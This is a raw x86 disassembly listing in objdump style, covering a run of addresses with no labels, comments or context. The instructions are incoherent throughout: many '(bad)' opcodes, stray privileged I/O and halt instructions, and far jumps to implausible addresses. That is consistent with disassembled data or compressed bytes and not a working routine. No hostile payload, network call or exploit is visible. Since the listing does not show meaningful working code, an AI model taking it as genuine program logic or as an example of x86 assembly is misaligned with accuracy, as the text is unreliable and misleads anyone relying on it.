  47a1cc:	jmp    0x2d8812ad
  47a1d1:	mov    ebp,0x9314af62
  47a1d6:	or     ebp,0xa72070c0
  47a1dc:	push   ebx
  47a1dd:	es dec edx
  47a1df:	aas    
  47a1e0:	mov    eax,ds:0xcadc000f
  47a1e5:	out    0x4c,eax
  47a1e7:	aaa    
  47a1e8:	xchg   ecx,eax
  47a1e9:	pop    edx
  47a1ea:	push   0x782748d2
  47a1ef:	test   DWORD PTR [edx+0x3a],ebp
  47a1f2:	test   DWORD PTR [eax],esp
  47a1f4:	inc    edx
  47a1f5:	push   esi
  47a1f6:	sbb    cl,bl
  47a1f8:	sbb    al,0x61
  47a1fa:	cmp    BYTE PTR [edi+0x3c],0x47
  47a1fe:	inc    esp
  47a1ff:	call   DWORD PTR [edi+0x40]
  47a202:	jmp    0x714020f4
  47a207:	loopne 0x47a191
  47a209:	(bad)  
  47a20b:	mov    edx,DWORD PTR [ebx+0x18]
  47a20e:	imul   esp,DWORD PTR [ebx-0x5c],0x3d
  47a212:	inc    ecx
  47a213:	das    
  47a214:	xor    bh,bh
  47a216:	sbb    eax,0x9e175483
  47a21b:	dec    edx
  47a21c:	sub    ch,BYTE PTR [eax+0x36361ca6]
  47a222:	inc    esp
  47a223:	sbb    al,0xa1
  47a225:	adc    DWORD PTR [edi],eax
  47a227:	dec    ecx
  47a228:	retf   0xd062
  47a22b:	push   esp
  47a22c:	mov    al,0x8c
  47a22e:	ror    BYTE PTR [edi+0x2b],cl
  47a231:	fs lock inc eax
  47a234:	test   BYTE PTR [ebx],cl
  47a236:	jne    0x47a1f3
  47a238:	adc    ch,ch
  47a23a:	mov    edx,0x2cd80310
  47a23f:	jns    0x47a1ec
  47a241:	shr    BYTE PTR [edx+0x61],1
  47a244:	and    al,0xe7
  47a247:	loope  0x47a1fc
  47a249:	mov    cl,0x50
  47a24b:	cmp    DWORD PTR [esi+edi*2+0x2f],eax
  47a24f:	sbb    DWORD PTR [eax+0x2e3448e2],esi
  47a255:	jle    0x47a26d
  47a257:	cmp    al,0x68
  47a259:	mov    bh,0x0
  47a25b:	iret   
  47a25c:	adc    DWORD PTR [edi+0x1e],ebx
  47a25f:	sub    ebx,0x6d0deb19
  47a265:	mov    ch,BYTE PTR [ebp+0x28]
  47a268:	and    BYTE PTR ds:0xd17f5c36,ah
  47a26e:	cmp    ch,bl
  47a270:	and    bl,ah
  47a272:	js     0x47a2a4
  47a274:	(bad)  
  47a276:	test   eax,0x4e9307e8
  47a27b:	rol    DWORD PTR [esp+eiz*8],1
  47a27e:	popa   
  47a27f:	lds    edx,FWORD PTR [ebp+0x1030b2fb]
  47a285:	pusha  
  47a286:	lods   eax,DWORD PTR ds:[esi]
  47a287:	or     cl,BYTE PTR [ecx-0x7c45bc9d]
  47a28d:	pop    edx
  47a28e:	test   esp,edi
  47a290:	pop    ebp
  47a291:	mov    al,ds:0xb5123c0
  47a296:	mov    edi,0x45051ffa
  47a29b:	push   0x45786243
  47a2a0:	cld    
  47a2a1:	retf   0x7a4
  47a2a4:	cmp    bl,BYTE PTR [edi+0x4]
  47a2a7:	jecxz  0x47a229
  47a2a9:	pop    ss
  47a2aa:	mov    BYTE PTR [edi],ah
  47a2ac:	mov    dh,0x43
  47a2ae:	pcmpeqb mm0,QWORD PTR [edi]
  47a2b1:	mov    cl,0xe1
  47a2b3:	pop    eax
  47a2b4:	mov    esi,esp
  47a2b6:	sar    DWORD PTR [ebx+0x23],1
  47a2b9:	hlt    
  47a2ba:	add    al,0x86
  47a2bc:	loope  0x47a2b2
  47a2be:	jg     0x47a2e7
  47a2c0:	xlat   BYTE PTR ds:[ebx]
  47a2c1:	fidivr WORD PTR [ebx]
  47a2c3:	enter  0x1fbd,0xc3
  47a2c7:	clc    
  47a2c8:	clc    
  47a2c9:	int    0xc6
  47a2cb:	mov    al,0x3b
  47a2cd:	mov    dh,0x3d
  47a2cf:	lea    esp,[ecx-0x171fbdad]
  47a2d5:	sti    
  47a2d6:	push   0x49d41bca
  47a2db:	cmp    al,0x75
  47a2dd:	push   edi
  47a2de:	sti    
  47a2df:	aam    0xba
  47a2e1:	repnz mov eax,0xd7f09710
  47a2e7:	scas   eax,DWORD PTR es:[edi]
  47a2e8:	inc    esp
  47a2e9:	sbb    ebp,DWORD PTR ds:0x3fd531e
  47a2ef:	push   0x22a18034
  47a2f4:	cmp    al,0x25
  47a2f6:	shl    DWORD PTR [edi-0xf],cl
  47a2f9:	sbb    eax,0x9582cf20
  47a2fe:	hlt    
  47a2ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47a300:	cmp    eax,edi
  47a302:	cmp    DWORD PTR [eax+eiz*2-0x75],esp
  47a306:	add    DWORD PTR [ecx-0x18],ecx
  47a309:	int3   
  47a30a:	sbb    BYTE PTR [edx+0xa],0xc1
  47a30e:	das    
  47a30f:	cld    
  47a310:	dec    DWORD PTR ds:0xb70b6054
  47a316:	mov    al,es:0x5e42d60b
  47a31c:	sub    cl,BYTE PTR [eax-0x5b]
  47a31f:	mov    al,ds:0x1bb4cff
  47a324:	aas    
  47a325:	sbb    al,0x8f
  47a327:	xor    BYTE PTR [edx+0x6c865f8e],ah
  47a32d:	xchg   ecx,eax
  47a32e:	adc    al,BYTE PTR [edi]
  47a330:	xchg   ecx,eax
  47a331:	ficom  WORD PTR [edi+0x161f43b0]
  47a337:	imul   ebp,DWORD PTR [ecx+0x3b97b5ef],0x25
  47a33e:	and    BYTE PTR [esi],0x96
  47a341:	dec    esi
  47a342:	jp     0x47a34a
  47a344:	mov    eax,ds:0xdf23965e
  47a349:	repz mov ah,0x96
  47a34c:	push   es
  47a34d:	mov    cl,0xcc
  47a34f:	in     al,0x2e
  47a351:	xor    al,0x97
  47a353:	(bad)  
  47a354:	fidiv  WORD PTR [ecx+0x78076edb]
  47a35a:	pop    ds
  47a35b:	cs addr16 clc 
  47a35e:	push   cs
  47a35f:	or     al,0x89
  47a361:	leave  
  47a362:	sar    DWORD PTR [eax+eiz*1-0x69],cl
  47a366:	dec    ebx
  47a367:	mov    ds,edx
  47a369:	popa   
  47a36a:	jmp    0xf552132
  47a36f:	test   BYTE PTR [esi],ch
  47a371:	push   ebp
  47a372:	icebp  
  47a373:	and    BYTE PTR [ebx-0x78b95d5c],bh
  47a379:	mov    ah,0xd0
  47a37b:	movsx  ebx,BYTE PTR [ecx]
  47a37e:	xchg   edx,eax
  47a37f:	outs   dx,DWORD PTR ds:[esi]
  47a380:	mov    eax,ds:0x34ffb154
  47a385:	repz mov al,ds:0xbc90bf
  47a38b:	push   edx
  47a38c:	(bad)  
  47a38d:	cs cld 
  47a38f:	sub    DWORD PTR [ecx],ebx
  47a391:	fsubr  st,st(7)
  47a393:	ins    DWORD PTR es:[edi],dx
  47a394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47a395:	ret    
  47a396:	hlt    
  47a397:	xor    BYTE PTR [edi],ah
  47a399:	call   0xc90fb02a
  47a39e:	outs   dx,BYTE PTR ds:[esi]
  47a39f:	sub    al,0x58
  47a3a1:	jl     0x47a3e7
  47a3a3:	(bad)  
  47a3a4:	adc    DWORD PTR [ebx],edi
  47a3a6:	mov    al,0xe7
  47a3a8:	inc    ecx
  47a3a9:	clc    
  47a3aa:	xor    esp,DWORD PTR [ebx]
  47a3ac:	int    0x49
  47a3ae:	jnp    0x47a41c
  47a3b0:	jmp    0x47a41f
  47a3b2:	sub    al,0xf4
  47a3b4:	in     al,0xf4
  47a3b6:	cwde   
  47a3b7:	iret   
  47a3b8:	jle    0x47a3c4
  47a3ba:	fldpi  
  47a3bc:	push   esi
  47a3bd:	daa    
  47a3be:	mov    edi,0xeb082bc2
  47a3c3:	inc    eax
  47a3c4:	jmp    0x189:0x558bfa1e
  47a3cb:	test   BYTE PTR [eax],bl
  47a3cd:	pop    ecx
  47a3ce:	push   edx
  47a3cf:	sub    esp,esp
  47a3d1:	jecxz  0x47a401
  47a3d3:	dec    ebp
  47a3d4:	stos   BYTE PTR es:[edi],al
  47a3d5:	push   ss
  47a3d6:	sub    dl,ch
  47a3d8:	and    eax,0xcfebdcf3
  47a3dd:	popa   
  47a3de:	push   esi
  47a3df:	mov    bl,dl
  47a3e1:	gs in  eax,0x97
  47a3e4:	in     al,0x26
  47a3e6:	in     al,0x47
  47a3e8:	sub    BYTE PTR ds:0x9ae0843a,bh
  47a3ee:	addr16 popa 
  47a3f0:	add    DWORD PTR [edi-0x2838291a],edx
  47a3f6:	push   eax
  47a3f7:	cmp    ch,BYTE PTR [edi+0x4f]
  47a3fa:	or     al,0x2b
  47a3fc:	dec    edi
  47a3fd:	pop    ebx
  47a3fe:	xor    al,0x1c
  47a400:	mov    edi,0xe70b3f00
  47a405:	sub    ebx,ecx
  47a407:	lods   al,BYTE PTR ds:[esi]
  47a408:	inc    edi
  47a409:	or     BYTE PTR [ebx],al
  47a40b:	inc    edi
  47a40c:	adc    BYTE PTR [ecx],al
  47a40e:	xor    dh,BYTE PTR [ecx]
  47a410:	or     esp,DWORD PTR [esi+0x3a]
  47a413:	dec    esi
  47a414:	out    0x5f,eax
  47a416:	pop    ebx
  47a417:	cwde   
  47a418:	pop    ecx
  47a419:	pop    eax
  47a41a:	in     eax,0x10
  47a41c:	xchg   bl,cl
  47a41e:	pop    ecx
  47a41f:	clc    
  47a420:	add    edx,DWORD PTR [eax-0x50]
  47a423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a424:	push   si
  47a426:	sar    DWORD PTR [eax+0x9b21c47],1
  47a42c:	and    al,BYTE PTR [edx+esi*4+0x8]
  47a430:	seto   al
  47a433:	enter  0x670f,0x7e
  47a437:	cmp    BYTE PTR [esi+eax*8+0x5b],0x42
  47a43c:	mov    edi,0x7f7f0a20
  47a441:	sbb    ah,BYTE PTR [esi-0x3fa29fc7]
  47a447:	stos   DWORD PTR es:[edi],eax
  47a448:	adc    DWORD PTR [edi+0x3e813ce8],eax
  47a44e:	pop    ebx
  47a44f:	sar    ch,cl
  47a451:	xchg   edx,eax
  47a452:	mov    ah,0x7c
  47a454:	and    dl,BYTE PTR [eax]
  47a456:	or     eax,0xbafda649
  47a45b:	jg     0x47a476
  47a45d:	mov    dl,0x3
  47a45f:	push   edi
  47a460:	add    dh,BYTE PTR [edx+esi*4]
  47a463:	or     ebx,DWORD PTR [eax]
  47a465:	enter  0x4b4,0x89
  47a469:	add    al,0x26
  47a46b:	dec    ebx
  47a46c:	mov    bh,0x9c
  47a46e:	(bad)  
  47a46f:	mov    eax,edx
  47a471:	push   cs
  47a472:	aas    
  47a473:	ins    BYTE PTR es:[edi],dx
  47a474:	jecxz  0x47a433
  47a476:	mov    ah,0xc5
  47a478:	aaa    
  47a479:	mov    al,0x74
  47a47b:	das    
  47a47c:	and    al,0x1b
  47a47e:	mov    al,0xdf
  47a480:	aas    
  47a481:	add    al,0x24
  47a483:	mov    dl,0x14
  47a485:	xchg   ebp,eax
  47a486:	push   edx
  47a487:	jno    0x47a463
  47a489:	mov    eax,0x4fdfa88d
  47a48e:	inc    ebp
  47a48f:	lods   al,BYTE PTR ds:[esi]
  47a490:	or     BYTE PTR [ebx-0x7d],0x37
  47a494:	add    BYTE PTR [esi],al
  47a496:	(bad)
  47a49a:	push   ds
  47a49b:	aaa    
  47a49c:	or     al,0xa1
  47a49e:	(bad)  
  47a49f:	pop    esi
  47a4a0:	xor    eax,0x277f5a16
  47a4a5:	lds    ebx,FWORD PTR [ecx-0x59579ebb]
  47a4ab:	xchg   ecx,eax
  47a4ac:	and    BYTE PTR [edx-0x48],dh
  47a4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a4b0:	inc    edi
  47a4b1:	jno    0x47a43b
  47a4b3:	in     al,0x7f
  47a4b5:	int3   
  47a4b6:	cdq    
  47a4b7:	rcl    DWORD PTR [ecx+0x85111c6],0x1f
  47a4be:	or     ebp,DWORD PTR [edi-0x282ed35f]
  47a4c4:	icebp  
  47a4c5:	pop    ss
  47a4c6:	add    BYTE PTR [eax+0x462fc01e],bh
  47a4cc:	adc    al,0x28
  47a4ce:	cld    
  47a4cf:	(bad)  [eax-0x3ef7e381]
  47a4d5:	jmp    0x47a4db
  47a4d7:	mov    bl,BYTE PTR [ebx+0x1a883ee8]
  47a4dd:	sbb    al,BYTE PTR [eax-0x1c7ef01d]
  47a4e3:	mov    ebp,DWORD PTR [esp+edi*4+0x19]
  47a4e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a4e8:	daa    
  47a4e9:	pop    edx
  47a4ea:	add    DWORD PTR [edx+0x41],esi
  47a4ed:	dec    esi
  47a4ee:	mov    al,ds:0x75c291e0
  47a4f3:	aam    0x77
  47a4f5:	dec    edx
  47a4f6:	jmp    0x2ad54000
  47a4fb:	in     al,0xfd
  47a4fd:	out    dx,al
  47a4fe:	inc    ecx
  47a4ff:	mov    ah,dl
  47a501:	enter  0x4c4d,0x0
  47a505:	inc    DWORD PTR [eax-0x167f2f3f]
  47a50b:	aaa    
  47a50c:	jae    0x47a543
  47a50e:	and    al,0x15
  47a510:	cwde   
  47a511:	and    edx,DWORD PTR [eax]
  47a513:	out    dx,al
  47a514:	sub    ah,BYTE PTR ds:0xb6980a79
  47a51a:	xor    esp,DWORD PTR [ebx]
  47a51c:	add    DWORD PTR [edx+ecx*8+0x38],esp
  47a520:	push   ds
  47a521:	or     al,0x4d
  47a523:	xchg   edx,eax
  47a524:	retf   
  47a525:	(bad)  
  47a526:	push   edi
  47a527:	add    al,cl
  47a529:	mov    BYTE PTR [edx],al
  47a52b:	inc    edx
  47a52c:	stos   BYTE PTR es:[edi],al
  47a52d:	mov    WORD PTR [ecx],fs
  47a52f:	loopne 0x47a509
  47a531:	cmp    bh,BYTE PTR [edi-0x3f0f4f74]
  47a537:	inc    ecx
  47a538:	jl     0x47a560
  47a53a:	push   0xc68be468
  47a53f:	outs   dx,DWORD PTR ds:[esi]
  47a540:	cmp    eax,0x419aac68
  47a545:	sub    al,0xff
  47a547:	bound  ebx,QWORD PTR [edx]
  47a549:	fnsave [edi-0x5d]
  47a54c:	push   eax
  47a54d:	xor    al,BYTE PTR [ebx-0x76fff4c3]
  47a553:	fnstenv [esi+0x67d74094]
  47a559:	inc    esi
  47a55a:	and    BYTE PTR [ecx+0x4345776c],0xc1
  47a561:	xchg   esi,eax
  47a562:	sbb    edx,edx
  47a564:	mov    gs,WORD PTR [eax+ebp*2+0x1f53369b]
  47a56b:	jecxz  0x47a5a4
  47a56d:	(bad)  
  47a56e:	test   BYTE PTR [eax],bl
  47a570:	xchg   esp,eax
  47a571:	mov    al,ah
  47a573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47a574:	adc    DWORD PTR [esi],ecx
  47a576:	retf   
  47a577:	das    
  47a578:	aas    
  47a579:	mov    ebp,0x33af0237
  47a57e:	adc    eax,0x23bee94
  47a583:	je     0x47a5ae
  47a585:	sbb    eax,0x4758585
  47a58a:	out    0x7c,eax
  47a58c:	adc    edx,DWORD PTR [esi+0x3077ecac]
  47a592:	jb     0x47a594
  47a594:	sub    DWORD PTR [ebx+edx*2+0xb018fd9],esp
  47a59b:	mov    dl,al
  47a59d:	jmp    0x47a550
  47a59f:	mov    esp,0x57c08e00
  47a5a4:	xor    ecx,DWORD PTR [eax-0x45638172]
  47a5aa:	sbb    ebp,DWORD PTR [ecx-0x6d]
  47a5ad:	push   eax
  47a5ae:	ss fs mov al,0x50
  47a5b2:	cmp    eax,0x49d0055f
  47a5b7:	inc    ebx
  47a5b8:	xor    DWORD PTR [ecx],ecx
  47a5ba:	fstp   DWORD PTR [ecx+0x2b]
  47a5bd:	mov    ah,0x30
  47a5bf:	jg     0x47a634
  47a5c1:	xchg   edi,eax
  47a5c2:	jle    0x47a55d
  47a5c4:	imul   edi,DWORD PTR [eax+0x388ce6a6],0x10
  47a5cb:	fimul  WORD PTR [esi+0x32]
  47a5ce:	aam    0xf4
  47a5d0:	mov    DWORD PTR [edx-0x2997cfe7],esi
  47a5d6:	nop
  47a5d7:	out    dx,al
  47a5d8:	sbb    BYTE PTR [ebp-0x7ad65430],al
  47a5de:	rcl    BYTE PTR [edx-0x64050779],1
  47a5e4:	lock or al,0x7c
  47a5e7:	mov    DWORD PTR [ecx-0x56],ecx
  47a5ea:	jmp    DWORD PTR [edx-0x27]
  47a5ed:	je     0x47a60a
  47a5ef:	adc    BYTE PTR ds:0x89037a4c,bl
  47a5f5:	adc    cl,BYTE PTR [ecx+0x30d91042]
  47a5fb:	sbb    DWORD PTR [ebp+0x4a],0x9fa798c1
  47a602:	inc    ebp
  47a603:	rol    bl,0x15
  47a606:	sbb    eax,0x5e1143b1
  47a60b:	and    esi,ecx
  47a60d:	jg     0x9cae2972
  47a613:	(bad)  
  47a614:	lea    edx,[esi]
  47a616:	ficom  WORD PTR [eax*4-0x7b1fbc57]
  47a61d:	mov    ds,WORD PTR [eax-0x20]
  47a620:	lahf   
  47a621:	push   ds
  47a622:	push   es
  47a623:	lock mov ebp,0x886cd8a0
  47a629:	inc    edi
  47a62a:	call   0x81015a56
  47a62f:	fcmovb st,st(6)
  47a631:	mov    es,WORD PTR [ecx+esi*4+0x22]
  47a635:	xchg   ebp,eax
  47a636:	adc    DWORD PTR [edi+eax*4],0x30d37610
  47a63d:	mul    BYTE PTR [edi]
  47a63f:	inc    esp
  47a640:	jp     0x47a68d
  47a642:	daa    
  47a643:	gs (bad) 
  47a645:	sub    al,0x50
  47a647:	outs   dx,BYTE PTR ds:[esi]
  47a648:	into   
  47a649:	dec    esp
  47a64a:	je     0x47a5f4
  47a64c:	fmul   QWORD PTR [esi+0x4a]
  47a64f:	cmp    eax,0xbe2201b1
  47a654:	and    DWORD PTR ds:0x108b7e58,edx
  47a65a:	sbb    edx,DWORD PTR [edi]
  47a65c:	jmp    DWORD PTR [esi+0x74]
  47a65f:	push   es
  47a660:	cmp    DWORD PTR [esi+0x10],0xffffffdf
  47a664:	jl     0x47a66c
  47a666:	clc    
  47a667:	pop    ecx
  47a668:	retf   
  47a669:	mov    ebp,DWORD PTR [edi-0x72]
  47a66c:	aam    0xcc
  47a66e:	sar    DWORD PTR [eax],cl
  47a670:	push   esp
  47a671:	add    al,0xf9
  47a673:	mov    ds,WORD PTR [esi+eax*8+0x4f7df600]
  47a67a:	xor    eax,0xaa621237
  47a67f:	sub    cl,BYTE PTR gs:0x645ac3ec
  47a686:	or     BYTE PTR [ecx+0x62],bl
  47a689:	leave  
  47a68a:	ds in  eax,0xdc
  47a68d:	pop    ss
  47a68e:	jnp    0x47a696
  47a690:	cs add al,0xfd
  47a693:	add    eax,0x7404463b
  47a698:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  47a69a:	xchg   esi,eax
  47a69b:	pop    ebx
  47a69c:	sbb    eax,0xc014391c
  47a6a1:	fisttp WORD PTR [ebp-0x64]
  47a6a4:	mov    ch,0x7d
  47a6a6:	cmp    edx,DWORD PTR [ebx]
  47a6a8:	sbb    ebp,DWORD PTR [ecx+ecx*1]
  47a6ab:	ss cwde 
  47a6ad:	js     0x47a6fa
  47a6af:	lea    eax,[eax+0x46a81c4b]
  47a6b5:	sbb    BYTE PTR [eax],bl
  47a6b7:	sub    BYTE PTR [edi-0x25e6263a],bh
  47a6bd:	dec    ebx
  47a6be:	mov    dl,0x66
  47a6c0:	jp     0x47a72e
  47a6c2:	daa    
  47a6c3:	sbb    dh,dl
  47a6c5:	or     al,0xbd
  47a6c7:	dec    BYTE PTR [edi]
  47a6c9:	mov    bh,0x40
  47a6cb:	sbb    BYTE PTR [edx+0x16ae606d],dl
  47a6d1:	sbb    cl,BYTE PTR [esi+0x570b20a4]
  47a6d7:	push   cs
  47a6d8:	adc    BYTE PTR [eax],dl
  47a6da:	sub    eax,DWORD PTR [esp+edi*2]
  47a6dd:	jmp    0x5ed0b7d5
  47a6e2:	add    al,0x97
  47a6e4:	sbb    BYTE PTR [edx+0x28c0a5b9],0x2d
  47a6eb:	xor    cl,BYTE PTR [ecx-0x493f7975]
  47a6f1:	sub    ecx,DWORD PTR [edx]
  47a6f3:	mov    edi,0x8e4d0168
  47a6f8:	mov    dh,0x10
  47a6fa:	xchg   ecx,eax
  47a6fb:	xlat   BYTE PTR ds:[ebx]
  47a6fc:	adc    DWORD PTR [eax-0x1c],eax
  47a6ff:	push   ecx
  47a700:	xor    dh,ch
  47a702:	cmp    ch,BYTE PTR [eax+ecx*1+0x360e7897]
  47a709:	mov    ebp,0x68dcf820
  47a70e:	loopne 0x47a721
  47a710:	xchg   edi,eax
  47a711:	lock mov ds:0x47f66493,eax
  47a717:	ins    DWORD PTR es:[edi],dx
  47a718:	cwde   
  47a719:	mov    eax,ds:0xfe0bb600
  47a71e:	and    DWORD PTR [ebx+ebx*2],edx
  47a721:	in     eax,dx
  47a722:	dec    esp
  47a723:	retf   
  47a724:	mov    BYTE PTR [esi-0x5a],ah
  47a727:	scas   eax,DWORD PTR es:[edi]
  47a728:	adc    eax,0x6c2967a0
  47a72d:	dec    ebx
  47a72e:	outs   dx,DWORD PTR ds:[esi]
  47a72f:	sbb    ah,BYTE PTR [esi+0x5e]
  47a732:	xchg   esi,eax
  47a733:	jno    0x47a797
  47a735:	adc    eax,0x43703110
  47a73a:	jbe    0x47a750
  47a73c:	xchg   edi,eax
  47a73d:	push   ebx
  47a73e:	mov    ds,WORD PTR [edx]
  47a740:	or     bh,BYTE PTR [eax-0x59]
  47a743:	sbb    BYTE PTR [edi],0xeb
  47a746:	inc    edx
  47a747:	ins    DWORD PTR es:[edi],dx
  47a748:	loopne 0x47a7b9
  47a74a:	pop    ss
  47a74b:	adc    edi,eax
  47a74d:	aam    0x1d
  47a74f:	add    DWORD PTR [ebp+0x16],esi
  47a752:	mov    ax,ds:0x255942c
  47a758:	ficom  WORD PTR [esi+0x1c462366]
  47a75e:	adc    ch,BYTE PTR [edi+ebx*4]
  47a761:	(bad)  
  47a762:	icebp  
  47a763:	push   cs
  47a764:	mov    ch,0xf0
  47a766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47a767:	pushf  
  47a768:	jmp    0x47a725
  47a76a:	sbb    al,0x88
  47a76c:	xchg   edi,eax
  47a76d:	pop    cx
  47a76f:	rol    bh,1
  47a771:	pop    esi
  47a772:	adc    dl,ch
  47a774:	sbb    al,0xe8
  47a776:	sbb    al,BYTE PTR [eax-0x5ef5449]
  47a77c:	scas   al,BYTE PTR es:[edi]
  47a77d:	sbb    al,0xec
  47a77f:	pop    ss
  47a780:	sub    edx,DWORD PTR [edx-0x40]
  47a783:	sub    ah,BYTE PTR [esi-0x7d]
  47a786:	dec    ebx
  47a787:	or     al,0x1e
  47a789:	sub    BYTE PTR [ebx],dl
  47a78b:	push   edx
  47a78c:	dec    ebp
  47a78d:	pushf  
  47a78e:	push   ds
  47a78f:	adc    BYTE PTR [eax+eiz*2-0x63fc83b3],al
  47a796:	xchg   edi,eax
  47a797:	inc    edx
  47a798:	outs   dx,BYTE PTR ds:[esi]
  47a799:	js     0x47a815
  47a79b:	adc    DWORD PTR [eax+ebx*1],edx
  47a79e:	xchg   ebp,eax
  47a79f:	adc    al,0xe8
  47a7a1:	push   esi
  47a7a2:	and    edx,ebp
  47a7a4:	adc    al,0xe7
  47a7a6:	jnp    0x47a810
  47a7a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47a7a9:	fld    QWORD PTR [ebp+ebp*1+0x740710ab]
  47a7b0:	shl    DWORD PTR [ebx+0x1],0x71
  47a7b4:	call   0xffccb557
  47a7b9:	loopne 0x47a7e4
  47a7bb:	mov    eax,ds:0x8c8f21c7
  47a7c0:	cmp    dh,BYTE PTR [esi+0x6f04d430]
  47a7c6:	push   es
  47a7c7:	add    eax,0xf467428
  47a7cc:	mov    dh,BYTE PTR [esi+0x30153e84]
  47a7d2:	xlat   BYTE PTR ds:[ebx]
  47a7d3:	adc    BYTE PTR [ebx-0x7e],cl
  47a7d6:	ds stos DWORD PTR es:[edi],eax
  47a7d8:	mov    al,0x9e
  47a7da:	fnstsw WORD PTR [edi+eax*1+0xe]
  47a7de:	dec    edi
  47a7df:	jge    0x47a7b9
  47a7e1:	pop    edx
  47a7e2:	fnstsw ax
  47a7e4:	imul   ecx,DWORD PTR [esi],0x98fdf972
  47a7ea:	and    BYTE PTR [esi],al
  47a7ec:	push   ebx
  47a7ed:	sbb    edi,DWORD PTR [eax+0x2f]
  47a7f0:	inc    ecx
  47a7f1:	cld    
  47a7f2:	push   ebx
  47a7f3:	push   0x660a94b4
  47a7f8:	jo     0x47a812
  47a7fa:	dec    esi
  47a7fb:	fdiv   QWORD PTR [eax-0x22]
  47a7fe:	push   0x26
  47a800:	xchg   edi,eax
  47a801:	ss test ebp,edi
  47a804:	setne  cl
  47a807:	mov    edx,0xf1ea07c
  47a80c:	add    al,0x44
  47a80e:	enter  0x88e8,0x54
  47a812:	ss das 
  47a814:	inc    ebp
  47a815:	inc    BYTE PTR [ebx+0x1a]
  47a818:	mov    WORD PTR [edx],cs
  47a81a:	and    ebx,DWORD PTR [eax+ecx*1-0x21]
  47a81e:	ds (bad) 
  47a820:	das    
  47a821:	stc    
  47a822:	adc    al,0xb7
  47a824:	dec    esp
  47a825:	gs data16 je 0x47a87d
  47a829:	outs   dx,DWORD PTR ds:[esi]
  47a82a:	jo     0x47a82c
  47a82c:	pushf  
  47a82d:	xor    DWORD PTR [ebp+0x174f2794],eax
  47a833:	sub    al,0x22
  47a835:	adc    DWORD PTR [eax+0x4a59ffdf],ecx
  47a83b:	add    edi,DWORD PTR [eax]
  47a83d:	pop    ss
  47a83e:	or     bh,dl
  47a840:	out    dx,al
  47a841:	mov    ds:0x40478d85,al
  47a846:	pop    ds
  47a847:	inc    eax
  47a848:	not    DWORD PTR [edi]
  47a84a:	dec    esi
  47a84b:	dec    esi
  47a84c:	mov    ecx,0xbf1c63e4
  47a851:	dec    BYTE PTR [edi+0x7]
  47a854:	add    DWORD PTR [ecx],edi
  47a856:	add    ch,cl
  47a858:	ins    BYTE PTR es:[edi],dx
  47a859:	fs xchg edx,eax
  47a85b:	sti    
  47a85c:	call   0x67e26871
  47a861:	ins    DWORD PTR es:[edi],dx
  47a862:	push   0x1a
  47a864:	cmovb  edx,DWORD PTR [edx]
  47a867:	test   al,0x44
  47a869:	and    eax,0xf37e2e91
  47a86e:	jno    0x47a874
  47a870:	cmp    ebx,DWORD PTR ss:[edi+0x4]
  47a874:	jne    0x47a8a7
  47a876:	daa    
  47a877:	adc    BYTE PTR [eax+0x6],ah
  47a87a:	jmp    0x896bd706
  47a87f:	jne    0x47a88a
  47a881:	hlt    
  47a882:	(bad)  
  47a883:	and    eax,0xfc4f7b2b
  47a888:	jno    0x47a886
  47a88a:	sbb    al,0x4a
  47a88c:	pop    ecx
  47a88d:	aas    
  47a88e:	dec    eax
  47a88f:	inc    ebp
  47a890:	mov    edx,0xe74b014
  47a895:	push   esi
  47a896:	rcr    al,0x72
  47a899:	cmp    eax,0x87ab0c83
  47a89e:	add    al,0xd2
  47a8a0:	dec    ecx
  47a8a1:	dec    edi
  47a8a2:	inc    esp
  47a8a3:	ret    0x3058
  47a8a6:	shl    BYTE PTR [esp+esi*4+0x66],cl
  47a8aa:	hlt    
  47a8ab:	pop    esi
  47a8ac:	dec    edi
  47a8ad:	outs   dx,DWORD PTR ds:[esi]
  47a8ae:	mov    eax,ds:0xedf71931
  47a8b3:	xor    eax,DWORD PTR [ebx-0x3ac7ef81]
  47a8b9:	mov    DWORD PTR [edx+0xa],ebp
  47a8bc:	sub    eax,0x4322bdd0
  47a8c1:	adc    DWORD PTR [edx+0x10f2193c],ebx
  47a8c7:	mov    WORD PTR [edi],es
  47a8c9:	dec    edi
  47a8ca:	ror    BYTE PTR [eax],1
  47a8cc:	std    
  47a8cd:	arpl   WORD PTR [esi],ax
  47a8cf:	xor    BYTE PTR es:[eax-0x5b1e49d6],dl
  47a8d6:	pop    eax
  47a8d7:	and    eax,0x91cfeb01
  47a8dc:	add    BYTE PTR [edi+0x3c],0x88
  47a8e0:	mov    DWORD PTR [eax],0xb3e7e36f
  47a8e6:	add    eax,0x726a48ae
  47a8eb:	and    BYTE PTR [edx],ah
  47a8ed:	mov    DWORD PTR [eax+ebx*1],esi
  47a8f0:	and    BYTE PTR [eax-0x586fb29e],bl
  47a8f6:	mov    ebx,DWORD PTR [esi-0x5a]
  47a8f9:	cli    
  47a8fa:	and    BYTE PTR [edx+0x1b560f3c],bl
  47a900:	(bad)  
  47a901:	jmp    0x47a910
  47a903:	nop
  47a904:	stos   BYTE PTR es:[edi],al
  47a905:	addr16 in eax,0x1d
  47a908:	adc    DWORD PTR ds:0xa8d28923,ebx
  47a90e:	into   
  47a90f:	popa   
  47a910:	xchg   edx,eax
  47a911:	jo     0x47a8f2
  47a913:	stos   BYTE PTR es:[edi],al
  47a914:	adc    BYTE PTR [ecx-0x28001015],dh
  47a91a:	pop    eax
  47a91b:	inc    ecx
  47a91c:	cmp    eax,0xbb1227c0
  47a921:	shl    DWORD PTR [edi+0x35330580],cl
  47a927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47a928:	mov    ds:0xe7602875,al
  47a92d:	push   esi
  47a92e:	adc    al,dl
  47a930:	lock or BYTE PTR [edx+eax*2+0x18ea4b3],dl
  47a938:	push   edi
  47a939:	xlat   BYTE PTR ds:[ebx]
  47a93a:	leave  
  47a93b:	aas    
  47a93c:	and    al,0x1c
  47a93e:	adc    DWORD PTR [eax+esi*8],esp
  47a941:	scas   eax,DWORD PTR es:[edi]
  47a942:	xor    DWORD PTR [edx+0x11],edx
  47a945:	xor    esi,0x57207ab0
  47a94b:	push   esi
